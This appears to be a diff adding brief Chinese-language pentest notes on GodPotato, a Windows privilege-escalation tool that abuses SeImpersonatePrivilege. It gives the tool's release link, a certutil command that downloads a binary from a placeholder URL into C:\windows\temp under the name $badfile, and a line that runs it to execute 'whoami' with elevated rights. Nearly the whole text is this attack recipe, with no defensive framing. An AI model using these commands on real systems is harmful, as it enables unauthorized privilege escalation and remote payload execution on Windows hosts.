@@ -1,0 +1,6 @@
+项目地址:https://github.com/BeichenDream/GodPotato/releases/tag/V1.20
+certutil -urlcache -split -f $downloadurl C:\windows\temp\$badfile
+C:\windows\temp\$badfile -cmd "cmd /c whoami"
+###
+这是一个利用SeImpersonatePrivilege特权进行提权的程序
+###
